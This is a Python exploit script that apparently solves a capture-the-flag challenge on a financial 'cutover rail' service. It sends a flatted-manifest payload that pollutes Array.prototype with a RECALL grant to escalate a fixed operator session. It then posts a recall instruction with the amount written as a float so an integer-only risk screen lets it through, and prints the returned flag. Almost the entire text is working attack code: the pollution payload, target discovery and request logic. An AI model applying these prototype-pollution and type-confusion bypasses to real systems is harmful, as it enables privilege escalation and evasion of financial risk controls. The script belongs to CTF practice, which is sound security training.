#!/usr/bin/env python3
"""Recall Glass Tide's planted batch on the MCSA Cutover rail.

Two requests, no dependencies (stdlib only):
  1. POST a flatted manifest that pollutes Array.prototype.RECALL = true,
     escalating the fixed OPERATOR session to the RECALL grant.
  2. POST the RECALL for the hostile batch, with its value written in
     exponential form so the risk gateway's integer screen defers past the
     exposure cap while the engine still parses 31_100_000.

The receipt's `authorization` field is the flag.

Note: this works against a FRESH instance. Once the batch is recalled the
engine splices it out of the queue, so a second run gets batch.not_found.
"""
import hashlib
import json
import sys
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://w03.ctf.chronos-security.ro:33241"
# Defaults match the w03 case in the writeup; discover() re-derives them per-instance
# from the live batch register (the planted batch settles above its declared figure
# AND above the rail exposure cap).
HOSTILE = "MRN-E798B3"
SETTLED = 31_100_000  # sum of the batch's instruction amounts (engine-settled aggregate)

# flatted: a value string is an index into the parsed `input` array; the string
# "__proto__" indexes input["__proto__"] -> Array.prototype, handed back as a
# plain value. normalise() then does merge(Array.prototype, hints).
POLLUTE = '[{"basis":"__proto__","hints":"1"},{"RECALL":true}]'


def post(path, body, content_type):
    req = urllib.request.Request(
        BASE + path, data=body.encode(), method="POST",
        headers={"content-type": content_type},
    )
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def discover():
    """Find the planted batch: settled aggregate (sum of instruction amounts) exceeds
    BOTH its declared figure and the rail exposure cap. Returns (batch_id, settled)."""
    global HOSTILE, SETTLED
    import re as _re
    import urllib.request as _u
    with _u.urlopen(BASE + "/api/v1/schema", timeout=15) as r:
        cap = int(_re.search(r'"exposure_cap_minor"\s*:\s*(\d+)', r.read().decode()).group(1))
    with _u.urlopen(BASE + "/batches", timeout=15) as r:
        data = json.load(r)
    batches = data["batches"] if isinstance(data, dict) and "batches" in data else data
    for b in batches:
        settled = sum(i["amountMinor"] for i in b["instructions"])
        if settled > b["declaredAggregateMinor"] and settled > cap:
            HOSTILE, SETTLED = b["id"], settled
            print(f"[*] hostile batch: {HOSTILE} settled={SETTLED} (declared={b['declaredAggregateMinor']}, cap={cap})")
            return
    print("[*] no clear hostile batch found; using defaults", HOSTILE, SETTLED)


def main():
    discover()

    # 1. pollute. normalise() runs before validate(), so the field:batch 400 is
    #    expected and the pollution has already landed on Array.prototype.
    print("[*] pollute:", post("/api/v1/manifests", POLLUTE, "text/plain"))

    # 2. recall. unlock ties the receipt to this batch + settled aggregate.
    #    value is sent in non-integer form (float) so the integer-only risk screen
    #    defers past the cap while the engine's JSON.parse still reads the aggregate.
    unlock = hashlib.sha256(f"cutover|{HOSTILE}|{SETTLED}".encode()).hexdigest()
    instr = {"type": "RECALL", "batch": HOSTILE, "value": float(SETTLED), "unlock": unlock}
    status, resp = post("/api/v1/instructions", json.dumps(instr), "application/json")
    print("[*] recall:", status, resp)

    try:
        auth = json.loads(resp)["receipt"]["authorization"]
        print("\n[+] FLAG:", auth)
    except Exception:
        print("\n[-] no receipt (fresh instance needed, or window closed)")


if __name__ == "__main__":
    main()
